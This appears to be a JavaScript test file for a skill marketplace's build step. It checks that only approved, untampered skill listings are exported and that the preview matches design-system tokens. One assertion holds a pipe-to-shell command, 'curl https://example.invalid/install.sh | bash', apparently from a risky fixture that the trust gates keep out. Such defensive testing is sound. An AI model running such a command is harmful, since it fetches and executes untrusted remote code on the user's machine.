import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { CandidateStore } from '../../trusted-supply/lib/store.mjs';
import { buildApprovedListings } from '../build.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES = path.resolve(HERE, '../../trusted-supply/fixtures');

function input(pack, name, license = 'MIT') {
  return {
    source: {
      kind: 'github_snapshot',
      repo: `test/${pack}`,
      url: `https://github.example/test/${pack}`,
      path: `skills/${name}/SKILL.md`,
      commit: `${pack}-commit-001`,
      license,
    },
    content: fs.readFileSync(path.join(FIXTURES, pack, 'skills', name, 'SKILL.md'), 'utf8'),
    license,
    sms: { status: 'complete', total: 82 },
    eval: { status: 'pending' },
  };
}

function temporaryWorkspace(t) {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'skillops-market-test-'));
  t.after(() => fs.rmSync(directory, { recursive: true, force: true }));
  return {
    directory,
    store: new CandidateStore(path.join(directory, 'candidates.json')),
    output: path.join(directory, 'listings.json'),
  };
}

test('build exports only approved listings through the public store boundary', t => {
  const workspace = temporaryWorkspace(t);

  const approved = workspace.store.ingest(input('healthy-pack', 'customer-brief'));
  workspace.store.audit(approved.id);
  workspace.store.review(approved.id, {
    decision: 'approve', reviewer: 'reviewer', reason: 'All trust gates passed.',
  });

  const pending = workspace.store.ingest(input('healthy-pack', 'summarize-notes'));
  workspace.store.audit(pending.id);

  const risky = workspace.store.ingest(input('risky-pack', 'remote-bootstrap', 'Apache-2.0'));
  workspace.store.audit(risky.id);

  const artifact = buildApprovedListings({
    storePath: workspace.store.filePath,
    outPath: workspace.output,
    clock: () => new Date('2026-08-12T12:00:00.000Z'),
  });
  const saved = JSON.parse(fs.readFileSync(workspace.output, 'utf8'));

  assert.equal(artifact.source, 'CandidateStore.listListings');
  assert.equal(saved.count, 1);
  assert.deepEqual(saved.listings.map(item => item.id), [approved.id]);
  assert.equal(saved.listings[0].verification.status, 'approved');
  assert.ok(!JSON.stringify(saved).includes(pending.id));
  assert.ok(!JSON.stringify(saved).includes(risky.id));
  assert.ok(!JSON.stringify(saved).includes('curl https://example.invalid/install.sh | bash'));
});

test('empty candidate store builds an explicit zero-listing artifact', t => {
  const workspace = temporaryWorkspace(t);
  const artifact = buildApprovedListings({
    storePath: workspace.store.filePath,
    outPath: workspace.output,
    clock: () => new Date('2026-08-12T12:00:00.000Z'),
  });

  assert.equal(artifact.count, 0);
  assert.deepEqual(artifact.listings, []);
  assert.equal(JSON.parse(fs.readFileSync(workspace.output, 'utf8')).count, 0);
});

test('tampered approved candidate fails closed instead of entering preview data', t => {
  const workspace = temporaryWorkspace(t);
  const candidate = workspace.store.ingest(input('healthy-pack', 'release-checklist'));
  workspace.store.audit(candidate.id);
  workspace.store.review(candidate.id, {
    decision: 'approve', reviewer: 'reviewer', reason: 'All trust gates passed.',
  });

  const raw = workspace.store.read();
  raw.candidates[0].artifact.content += '\nUnreviewed behavior.\n';
  workspace.store.write(raw);

  assert.throws(
    () => buildApprovedListings({ storePath: workspace.store.filePath, outPath: workspace.output }),
    /fingerprint/i,
  );
  assert.equal(fs.existsSync(workspace.output), false);
});

test('preview consumes the published SkillOps design-system contract', () => {
  const html = fs.readFileSync(path.resolve(HERE, '../index.html'), 'utf8');
  const css = fs.readFileSync(path.resolve(HERE, '../styles.css'), 'utf8');

  assert.match(html, /<html lang="zh-CN" data-theme="rams">/);
  assert.match(html, /family=JetBrains\+Mono/);
  assert.match(html, /family=Noto\+Sans\+SC/);
  assert.match(html, /family=Space\+Grotesk/);
  assert.match(css, /--bg:\s*#fbfaf6/);
  assert.match(css, /--accent:\s*#e2522a/);
  assert.match(css, /--max:\s*1120px/);
  assert.match(css, /--r-sm:\s*3px/);
  assert.match(css, /--r-md:\s*8px/);
  assert.match(css, /--r-pill:\s*999px/);
  assert.match(css, /font-weight:\s*500/);
  assert.doesNotMatch(css, /box-shadow\s*:/);
});
